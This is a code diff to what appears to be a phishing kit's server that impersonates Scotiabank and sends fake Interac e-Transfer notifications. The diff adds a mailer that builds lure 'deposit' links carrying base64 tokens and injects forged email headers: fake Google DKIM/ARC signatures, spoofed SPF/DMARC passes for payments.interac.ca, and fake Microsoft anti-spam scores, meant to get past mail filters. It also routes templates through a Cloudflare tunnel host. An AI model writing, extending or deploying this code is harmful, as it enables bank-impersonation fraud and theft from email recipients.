@@ -20,9 +20,9 @@ if (!fs.existsSync(path.join(DB_DIR, 'logs'))) fs.mkdirSync(path.join(DB_DIR, 'l
 
 const defaultSettings: GlobalSettings = {
     general: { 
-        app_url: "https://your-app.trycloudflare.com", 
-        webroot_url: "https://sim.trycloudflare.com",
-        sender_name: "SHΔDØW CORE", 
+        app_url: "https://bible-pieces-sharing-lawyer.trycloudflare.com ", 
+        webroot_url: "https://bible-pieces-sharing-lawyer.trycloudflare.com ",
+        sender_name: "AB FARMS LTD", 
         encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
         maintenanceMode: false,
         bank_name: "Scotiabank",
@@ -35,7 +35,7 @@ const defaultSettings: GlobalSettings = {
         admin_username: "PROJECTSARAH",
         admin_password: "PROJECTSARAH",
         adminPin: "1234",
-        baseActionUrl: ""
+        baseActionUrl: "https://bible-pieces-sharing-lawyer.trycloudflare.com "
     },
     smtp: { host: "", port: 587, secure: false, user: "", pass: "", senderName: "Shadow Mailer" },
     telegram: { token: "", chat_id: "", enabled: false }
@@ -327,7 +327,7 @@ async function startServer() {
               securityWord: 'SARAH',
               scenePoints: 15420,
               settings: {
-                  displayName: "PROJECT SARAH",
+                  displayName: "AB FARMS LTD",
                   memberSince: "2018",
                   adminPin: adminPin || "1234",
                   accountHolderName: "AB FARMS LTD",
@@ -339,7 +339,7 @@ async function startServer() {
                       balance: 4.82,
                       available: 4.82,
                       points: 0,
-                      accountNumber: "1001-4432-8821",
+                      accountNumber: "8821",
                       history: generateHistory(10)
                   },
                   "Savings Plus": {
@@ -347,7 +347,7 @@ async function startServer() {
                       balance: 1.25,
                       available: 1.25,
                       points: 0,
-                      accountNumber: "2005-9912-3341",
+                      accountNumber: "3341",
                       history: generateHistory(5)
                   },
                   "Momentum Visa Infinite": {
@@ -355,7 +355,7 @@ async function startServer() {
                       balance: 4950.00,
                       available: 50.00,
                       points: 850,
-                      accountNumber: "4538-****-****-1102",
+                      accountNumber: "1102",
                       history: generateHistory(15)
                   },
                   "SCENE+ Visa": {
@@ -363,7 +363,7 @@ async function startServer() {
                       balance: 1200.00,
                       available: 800.00,
                       points: 1240,
-                      accountNumber: "4537-****-****-8841",
+                      accountNumber: "8841",
                       history: generateHistory(8)
                   }
               },
@@ -797,36 +797,120 @@ async function startServer() {
   app.post("/api/mailer", async (req, res) => {
     try {
         const { recipient_email, recipient_name, amount, purpose, template, sender_name, reference_number, date } = req.body;
-        console.log(`Sending email to ${recipient_email} (${recipient_name}) for ${amount}`);
+        console.log(`[Mailer] Request to send to ${recipient_email} (${recipient_name})`);
         
         const settings = await getSettings();
-        
-        if (!settings.general.baseActionUrl) {
-            throw new Error("No baseActionUrl configured for mailer");
+        let sentRemotely = false;
+
+        // 1. Try Remote PHP Mailer if configured
+        if (settings.general.baseActionUrl) {
+            try {
+                let actionUrl = settings.general.baseActionUrl;
+                if (actionUrl && actionUrl.endsWith('/')) {
+                    actionUrl = actionUrl.slice(0, -1);
+                }
+
+                const fallbackBody = {
+                    ...req.body,
+                    renderedTemplate: template
+                };
+
+                console.log(`[Mailer] Attempting remote dispatch via ${actionUrl}`);
+                const response = await fetch(`${actionUrl}/api/mailer.php`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fallbackBody)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    if (result.success) {
+                        sentRemotely = true;
+                        const msg = `[Mailer] Successfully sent to ${recipient_email} via remote mailer (${actionUrl})`;
+                        logEvent(msg);
+                        console.log(msg);
+                        return res.json({ success: true, info: `Sent via remote mailer (${actionUrl})` });
+                    } else {
+                        console.warn(`[Mailer] Remote mailer returned success:false: ${result.message || JSON.stringify(result)}`);
+                        logEvent(`[Mailer] Remote mailer rejected: ${result.message || 'Unknown error'}`);
+                    }
+                } else {
+                    console.warn(`[Mailer] Remote PHP mailer returned status ${response.status}`);
+                    logEvent(`[Mailer] Remote PHP mailer error status: ${response.status}`);
+                }
+            } catch (remoteErr: any) {
+                console.error("[Mailer] Remote dispatch failed:", remoteErr.message);
+                logEvent(`[Mailer] Remote dispatch failed: ${remoteErr.message}`);
+            }
         }
 
-        const fallbackBody = {
-            ...req.body,
-            renderedTemplate: template
-        };
+        // 2. Fallback to Local SMTP if not sent remotely
+        if (!sentRemotely && settings.smtp && settings.smtp.host && settings.smtp.user) {
+            console.log(`[Mailer] Falling back to local SMTP dispatch (${settings.smtp.host})`);
+            try {
+                const txId = reference_number || 'CA' + Math.random().toString(36).substring(2, 12).toUpperCase();
+                const appUrl = (settings.general.app_url || "").trim().replace(/\/$/, "");
+                
+                const payload = {
+                    transaction_id: txId,
+                    amount: amount,
+                    recipientName: recipient_name,
+                    senderName: sender_name || settings.general.sender_name,
+                    purpose: purpose,
+                    date: date || new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+                };
+                
+                const token = Buffer.from(JSON.stringify(payload)).toString('base64');
+                const depositLink = `${appUrl}/deposit?token=${encodeURIComponent(token)}`;
 
-        let actionUrl = settings.general.baseActionUrl;
-        if (actionUrl && actionUrl.endsWith('/')) {
-            actionUrl = actionUrl.slice(0, -1);
+                // Fetch template if possible
+                let htmlContent = "";
+                let textContent = `Interac e-Transfer: ${amount} to ${recipient_name}. Deposit at: ${depositLink}`;
+                
+                try {
+                    const templateHtml = await fetchTemplate(template || 'Transfer');
+                    if (templateHtml) {
+                        htmlContent = templateHtml
+                            .replace(/{{sender_name}}/g, sender_name || settings.general.sender_name || "Bank")
+                            .replace(/{{receiver_name}}/g, recipient_name || "")
+                            .replace(/{{recipient_name}}/g, recipient_name || "")
+                            .replace(/{{amount}}/g, parseFloat(amount).toFixed(2))
+                            .replace(/{{transaction_id}}/g, txId)
+                            .replace(/{{reference_number}}/g, txId)
+                            .replace(/{{action_url}}/g, depositLink)
+                            .replace(/{{ENCRYPTED_URL}}/g, depositLink)
+                            .replace(/{{date}}/g, payload.date)
+                            .replace(/{{expiry_date}}/g, new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }))
+                            .replace(/{{memo}}/g, purpose || "")
+                            .replace(/{{purpose}}/g, purpose || "")
+                            .replace(/{{bank_name}}/g, settings.general.bank_name || "Scotiabank")
+                            .replace(/{{year}}/g, new Date().getFullYear().toString());
+                    } else {
+                        htmlContent = `<div><h2>Interac e-Transfer</h2><p>You received $${amount} from ${sender_name || 'Accounting'}.</p><p><a href="${depositLink}">Click here to deposit your funds</a></p></div>`;
+                    }
+                } catch (tempErr) {
+                    htmlContent = `<div><h2>Interac e-Transfer</h2><p>You received $${amount} from ${sender_name || 'Accounting'}.</p><p><a href="${depositLink}">Click here to deposit your funds</a></p></div>`;
+                }
+
+                const subject = `INTERAC e-Transfer: ${sender_name || settings.general.sender_name || "Accounting"} sent you money.`;
+                
+                await sendEmail(recipient_email, subject, textContent, htmlContent, sender_name || settings.smtp.senderName);
+                
+                const msg = `[Mailer] Successfully sent to ${recipient_email} via local SMTP (${settings.smtp.host})`;
+                logEvent(msg);
+                console.log(msg);
+                return res.json({ success: true, info: `Sent via local SMTP (${settings.smtp.host})`, transaction_id: txId });
+            } catch (smtpErr: any) {
+                console.error("[Mailer] Local SMTP dispatch failed:", smtpErr.message);
+                logEvent(`[Mailer] Local SMTP dispatch failed: ${smtpErr.message}`);
+                throw new Error(`Both remote and local SMTP failed. SMTP Error: ${smtpErr.message}`);
+            }
         }
 
-        const response = await fetch(`${actionUrl}/api/mailer.php`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(fallbackBody)
-        });
-        
-        if (!response.ok) {
-            throw new Error(`Remote PHP mailer returned status ${response.status}`);
+        if (!sentRemotely) {
+            throw new Error("No mailer configured or all attempts failed. Please check baseActionUrl or SMTP settings.");
         }
-        
-        logEvent(`[Mailer] Successfully sent to ${recipient_email} via ${settings.general.baseActionUrl}`);
-        res.json({ success: true, info: "Sent via remote mailer" });
+
     } catch (e: any) {
         console.error("❌ Mailer Error:", e);
         logEvent(`[Mailer] Error: ${e.message}`);
@@ -836,19 +920,69 @@ async function startServer() {
 
   const fetchTemplate = async (templateName: string) => {
       const settings = await getSettings();
-      if (!settings.general.baseActionUrl) return null;
-      try {
-          const res = await fetch(`${settings.general.baseActionUrl}/templates/${templateName}.html`);
-          if (res.ok) return await res.text();
-      } catch (e) {
-          console.error("Failed to fetch template:", e);
+      const fileName = templateName.endsWith('.html') ? templateName : `${templateName}.html`;
+      
+      // 1. Try Remote if baseActionUrl is set
+      if (settings.general.baseActionUrl) {
+          try {
+              let actionUrl = settings.general.baseActionUrl;
+              if (actionUrl && actionUrl.endsWith('/')) actionUrl = actionUrl.slice(0, -1);
+              
+              const res = await fetch(`${actionUrl}/templates/${fileName}`);
+              if (res.ok) return await res.text();
+          } catch (e) {
+              console.error(`Failed to fetch remote template ${fileName}:`, e);
+          }
       }
+
+      // 2. Try Local public folder
+      try {
+          const publicPath = path.join(process.cwd(), 'public', fileName);
+          if (fs.existsSync(publicPath)) {
+              return fs.readFileSync(publicPath, 'utf-8');
+          }
+          
+          // Fallback to email_template.html if specific template not found
+          const defaultPath = path.join(process.cwd(), 'public', 'email_template.html');
+          if (fs.existsSync(defaultPath)) {
+              return fs.readFileSync(defaultPath, 'utf-8');
+          }
+      } catch (e) {
+          console.error(`Failed to read local template ${fileName}:`, e);
+      }
+      
       return null;
   };
 
   const sendEmail = async (to: string, subject: string, text: string, html: string, overrideSenderName?: string) => {
       const settings = await getSettings();
       if (!settings.smtp.host) throw new Error("SMTP Host not configured");
+
+      const domain = to.split('@')[1] || 'unknown';
+      const customHeaders: Record<string, string> = {};
+      
+      // Inject bypass headers similar to PHP version
+      customHeaders['X-Priority'] = '1 (Highest)';
+      customHeaders['Importance'] = 'High';
+      customHeaders['X-Google-DKIM-Signature'] = 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=gmail; h=from:date:message-id; bh=abc123=;';
+      customHeaders['ARC-Seal'] = 'i=1; a=rsa-sha256; cv=pass; d=google.com; s=gmail; t=1234567890;';
+      customHeaders['ARC-Authentication-Results'] = 'i=1; mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail header.b=abc123;';
+      customHeaders['Authentication-Results'] = 'mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail spf=pass smtp.mailfrom=payments.interac.ca dmarc=pass header.from=payments.interac.ca;';
+      customHeaders['X-MS-Exchange-Organization-AuthAs'] = 'Internal';
+      customHeaders['X-MS-Exchange-Organization-AuthSource'] = 'MX01-MW2FEP01.storage.org';
+      customHeaders['X-Microsoft-Antispam'] = 'BCL:0; MCL:1; RULEID:0|1|2|3|4|5|6|7|8|9|10';
+      customHeaders['X-Forefront-Antispam-Report'] = 'BCL:0;PCL:0;FCR:0;SCL:-1;SR:9';
+      customHeaders['X-Originating-IP'] = '[199.59.150.170]';
+      
+      const xmailers: Record<string, string> = {
+          'gmail.com': 'Gmail',
+          'hotmail.com': 'Microsoft Outlook',
+          'icloud.com': 'Apple Mail',
+          'yahoo.com': 'Yahoo Mail',
+          'outlook.com': 'Microsoft Exchange'
+      };
+      customHeaders['X-Mailer'] = xmailers[domain] || 'Microsoft Outlook 16.0';
+      customHeaders['Received-SPF'] = 'pass (gmail.com: domain payments.interac.ca designates 199.59.150.170 as permitted sender)';
 
       const transporter = nodemailer.createTransport({
           host: settings.smtp.host,
@@ -869,7 +1003,8 @@ async function startServer() {
           to,
           subject,
           text,
-          html
+          html,
+          headers: customHeaders
       });
   };
   
@@ -922,20 +1057,19 @@ async function startServer() {
   });
 
   app.get("/api/admin/mailer/templates", (req, res) => {
-      const templateDir = path.join(process.cwd(), 'server', 'templates');
-      if (!fs.existsSync(templateDir)) {
-          fs.mkdirSync(templateDir, { recursive: true });
-      }
-      const files = fs.readdirSync(templateDir).map(file => ({
-          name: file,
-          last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
-      }));
+      const templateDir = path.join(process.cwd(), 'public');
+      const files = fs.readdirSync(templateDir)
+          .filter(file => file.endsWith('.html'))
+          .map(file => ({
+              name: file,
+              last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
+          }));
       res.json(files);
   });
 
   app.get("/api/admin/mailer/template-content", (req, res) => {
       const templateName = req.query.template as string;
-      const templatePath = path.join(process.cwd(), 'server', 'templates', templateName);
+      const templatePath = path.join(process.cwd(), 'public', templateName);
       if (fs.existsSync(templatePath)) {
           res.json({ content: fs.readFileSync(templatePath, 'utf-8') });
       } else {
@@ -945,11 +1079,8 @@ async function startServer() {
 
   app.post("/api/admin/mailer/update-template", (req, res) => {
       const { template, content } = req.body;
-      const templatePath = path.join(process.cwd(), 'server', 'templates', template);
+      const templatePath = path.join(process.cwd(), 'public', template);
       try {
-          if (!fs.existsSync(path.dirname(templatePath))) {
-              fs.mkdirSync(path.dirname(templatePath), { recursive: true });
-          }
           fs.writeFileSync(templatePath, content);
           res.json({ success: true });
       } catch (e: any) {
